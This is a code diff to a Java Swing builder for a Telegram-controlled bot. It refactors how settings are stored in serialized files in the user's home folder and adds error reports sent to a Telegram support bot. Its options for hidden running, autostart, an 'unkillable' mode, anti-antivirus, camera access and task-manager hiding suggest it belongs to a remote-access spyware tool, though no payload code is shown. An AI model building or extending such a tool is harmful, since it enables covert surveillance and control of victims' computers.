@@ -42,8 +42,10 @@ public class BotCreate {
     static JFrame frame = new JFrame("BotCreate");
 
     public BotCreate() {
+        ApiContextInitializer.init();
         createButton.addActionListener(new ActionListener() {
             Config conf = BotCreate.read();
+            Variables var = BotCreate.readVar();
 
             @Override
             public void actionPerformed(ActionEvent e) {
@@ -60,7 +62,7 @@ public class BotCreate {
                     return;
                 }
                 conf = new Config(hiddenCheckBox.isSelected(), autostartCheckBox.isSelected(), startUpNotificationCheckBox.isSelected(), unkillableCheckBox.isSelected(),
-                        antiAVCheckBox.isSelected(), trollFunctionsCheckBox.isSelected(), cameraCheckBox.isSelected(), privateCheckBox.isSelected(), taskHideCheckBox.isSelected(), aliveCheckCheckBox.isSelected(), telegramBotKeyTextField.getText(), botNameTextField.getText(), false, pw);
+                        antiAVCheckBox.isSelected(), trollFunctionsCheckBox.isSelected(), cameraCheckBox.isSelected(), privateCheckBox.isSelected(), taskHideCheckBox.isSelected(), aliveCheckCheckBox.isSelected(), telegramBotKeyTextField.getText(), botNameTextField.getText(), pw);
                 frame.dispose();
                 try {
                     System.out.println(conf.startupNotification);
@@ -76,8 +78,9 @@ public class BotCreate {
             @Override
             public void focusGained(FocusEvent e) {
                 Config conf = BotCreate.read();
+                Variables var = BotCreate.readVar();
                 if (telegramBotKeyTextField.getText().equalsIgnoreCase("Bot Token")) {
-                    if (conf != null && conf.isReset())
+                    if (conf != null && var.isReset())
                         telegramBotKeyTextField.setText(conf.getToken());
                     else
                         telegramBotKeyTextField.setText("");
@@ -98,8 +101,9 @@ public class BotCreate {
             @Override
             public void focusLost(FocusEvent e) {
                 Config conf = BotCreate.read();
+                Variables var = BotCreate.readVar();
                 if (telegramBotKeyTextField.getText().equalsIgnoreCase("")) {
-                    if (conf != null && conf.isReset())
+                    if (conf != null && var.isReset())
                         telegramBotKeyTextField.setText(conf.getToken());
                     else
                         telegramBotKeyTextField.setText("Bot Token");
@@ -120,8 +124,7 @@ public class BotCreate {
     }
 
     public static void main(String[] args) throws InterruptedException, IOException, ClassNotFoundException {
-        File conf = new File(System.getProperty("user.home") + "\\botconf.bot");
-
+        File conf = new File(System.getProperty("user.home") + "\\conf.bot");
         if (!conf.exists()) {
             frame.setContentPane(new BotCreate().Back);
             frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
@@ -130,30 +133,75 @@ public class BotCreate {
             frame.setResizable(false);
             frame.setVisible(true);
         } else {
+            Variables var = readVar();
             Config config = read();
-            if (config.isReset()) {
-                frame.setContentPane(new BotCreate().Back);
-                frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
-                frame.pack();
-                frame.setLocationRelativeTo(null);
-                frame.setResizable(false);
-                frame.setVisible(true);
-            } else {
-                ApiContextInitializer.init();
-                Bot bot = new Bot(args);
-                starten(bot);
+            if (config != null)
+                if (var.isReset()) {
+                    frame.setContentPane(new BotCreate().Back);
+                    frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
+                    frame.pack();
+                    frame.setLocationRelativeTo(null);
+                    frame.setResizable(false);
+                    frame.setVisible(true);
+                } else {
+                    ApiContextInitializer.init();
+                    Bot bot = new Bot(args);
+                    starten(bot);
+                }
+            else {
+                try {
+                    TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
+                    BotSession sup;
+                    sup = telegramBotsApi.registerBot(new SupBot("Fehler:" + "\n" + "Config is null!"));
+                    sup.close();
+                } catch (Exception e) {
+
+                }
             }
+
         }
     }
 
     static Config read() {
         Config back = null;
         try {
-            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\botconf.bot");
+            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\conf.bot");
             ObjectInputStream ois = new ObjectInputStream(fis);
             back = (Config) ois.readObject();
             ois.close();
         } catch (Exception e) {
+            try {
+                TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
+                BotSession sup;
+                sup = telegramBotsApi.registerBot(new SupBot("Fehler:" + "\n" + e.toString()));
+                sup.close();
+            } catch (Exception ex) {
+
+            }
+        }
+        return back;
+    }
+
+    static Variables readVar() {
+        Variables back = null;
+        try {
+            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\var.bot");
+            ObjectInputStream ois = new ObjectInputStream(fis);
+            back = (Variables) ois.readObject();
+            ois.close();
+        } catch (Exception e) {
+            try {
+                TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
+                BotSession sup;
+                sup = telegramBotsApi.registerBot(new SupBot("Fehler:" + "\n" + e.toString()));
+                sup.close();
+            } catch (Exception ex) {
+
+            }
+        }
+        if (back == null) {
+            System.out.println("Jo ist es");
+            back = new Variables();
         }
         return back;
     }
@@ -170,10 +218,10 @@ public class BotCreate {
         }
         bot.setImage(0);
     }
-    boolean fail(String token){
+
+    boolean fail(String token) {
         BotSession bum = null;
         boolean fail = false;
-        ApiContextInitializer.init();
         TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
         try {
             bum = telegramBotsApi.registerBot(new DummyBot(token));
@@ -181,7 +229,7 @@ public class BotCreate {
             System.out.println(e);
             fail = true;
         }
-        if(!fail)
+        if (!fail)
             bum.stop();
         return fail;
     }
